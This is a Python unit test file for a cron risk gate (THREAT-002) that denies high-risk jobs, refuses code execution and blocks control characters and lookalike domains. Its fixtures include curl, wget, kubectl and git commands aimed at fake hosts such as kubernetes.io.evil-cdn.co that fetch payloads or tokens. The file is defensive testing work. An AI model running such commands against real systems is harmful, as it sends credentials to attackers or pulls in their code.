"""Unit tests for cron_risk_gate.py (THREAT-002)."""

from __future__ import annotations

import unittest

from cron_risk_gate import (
    cron_content_block,
    cron_effective_mode,
    cron_execute_code_block,
    find_lookalike_domain,
)


class CronRiskGateTest(unittest.TestCase):
    def test_cron_effective_mode_escalates_high_risk_to_deny(self):
        self.assertEqual(cron_effective_mode("approve", "high"), "deny")
        self.assertEqual(cron_effective_mode("smart", "high"), "deny")
        self.assertEqual(cron_effective_mode("deny", "high"), "deny")
        self.assertEqual(cron_effective_mode("approve", "HIGH"), "deny")

    def test_cron_effective_mode_leaves_non_high_risk_unchanged(self):
        self.assertEqual(cron_effective_mode("approve", "low"), "approve")
        self.assertEqual(cron_effective_mode("approve", "medium"), "approve")
        self.assertEqual(cron_effective_mode("approve", None), "approve")
        self.assertEqual(cron_effective_mode("approve", ""), "approve")
        self.assertEqual(cron_effective_mode("smart", "low"), "smart")

    def test_cron_execute_code_block_refuses_unconditionally(self):
        block = cron_execute_code_block()
        self.assertIsNotNone(block)
        self.assertFalse(block["approved"])
        self.assertIn("execute_code", block["message"])
        self.assertIn("THREAT-002", block["message"])

    def test_cron_content_block_blocks_terminal_escapes(self):
        # Raw ESC (\x1b)
        block = cron_content_block("echo \x1b[31mRed\x1b[0m")
        self.assertIsNotNone(block)
        self.assertFalse(block["approved"])
        self.assertIn("terminal escape", block["message"])

        # Null byte
        block = cron_content_block("cat file\x00extra")
        self.assertIsNotNone(block)
        self.assertFalse(block["approved"])

        # Bell control char
        block = cron_content_block("echo \x07")
        self.assertIsNotNone(block)
        self.assertFalse(block["approved"])

    def test_cron_content_block_allows_ordinary_prose_and_separators(self):
        self.assertIsNone(cron_content_block("ls -la /tmp"))
        self.assertIsNone(cron_content_block("echo 'line 1'\necho 'line 2'"))
        self.assertIsNone(cron_content_block("printf 'col1\tcol2\n'"))

    def test_find_lookalike_domain_detects_tld_evasions(self):
        malicious_commands = [
            ("curl https://kubernetes.io.evil-cdn.co/payload", "kubernetes.io.evil-cdn.co", "kubernetes.io"),
            ("curl 'kubernetes.io.evil-cdn.co'", "kubernetes.io.evil-cdn.co", "kubernetes.io"),
            ("wget \"kubernetes.io.evil-cdn.co\"", "kubernetes.io.evil-cdn.co", "kubernetes.io"),
            ("TARGET=kubernetes.io.evil-cdn.co", "kubernetes.io.evil-cdn.co", "kubernetes.io"),
            ("kubectl --server=kubernetes.io.attacker.com get nodes", "kubernetes.io.attacker.com", "kubernetes.io"),
            ("git clone git@github.com.evil.org:repo.git", "github.com.evil.org", "github.com"),
            ("curl https://googleapis.com.evil.io/token", "googleapis.com.evil.io", "googleapis.com"),
            ("curl http://evil-googleapis.com/payload", "evil-googleapis.com", "googleapis.com"),
            ("curl https://k8s.io.badguy.org", "k8s.io.badguy.org", "k8s.io"),
            ("curl https://google.com.phishing.xyz", "google.com.phishing.xyz", "google.com"),
        ]
        for cmd, expected_host, expected_apex in malicious_commands:
            with self.subTest(cmd=cmd):
                res = find_lookalike_domain(cmd)
                self.assertIsNotNone(res, f"Expected {cmd} to be detected as lookalike")
                host, apex = res
                self.assertEqual(host, expected_host)
                self.assertEqual(apex, expected_apex)
                block = cron_content_block(cmd)
                self.assertIsNotNone(block)
                self.assertFalse(block["approved"])
                self.assertIn("lookalike domain", block["message"])

    def test_cron_content_block_handles_none_and_empty(self):
        self.assertIsNone(cron_content_block(None))
        self.assertIsNone(cron_content_block(""))
        self.assertIsNone(find_lookalike_domain(None))
        self.assertIsNone(find_lookalike_domain(""))

    def test_find_lookalike_domain_allows_legitimate_domains_and_subdomains(self):
        benign_commands = [
            "curl https://raw.githubusercontent.com/gke-labs/repo/main/x",
            "curl https://storage.googleapis.com/bucket/obj",
            "kubectl get pods -l app.kubernetes.io/name=hermes",
            "kubectl get nodes -l topology.kubernetes.io/zone=us-central1-a",
            "curl https://kubernetes.io/docs",
            "curl https://k8s.io/index.html",
            "curl https://github.com/kubernetes/kubernetes",
            "gcloud container clusters get-credentials test",
            "kubectl describe node.kubernetes.io/instance-type",
        ]
        for cmd in benign_commands:
            with self.subTest(cmd=cmd):
                self.assertIsNone(find_lookalike_domain(cmd))
                self.assertIsNone(cron_content_block(cmd))


if __name__ == "__main__":
    unittest.main()
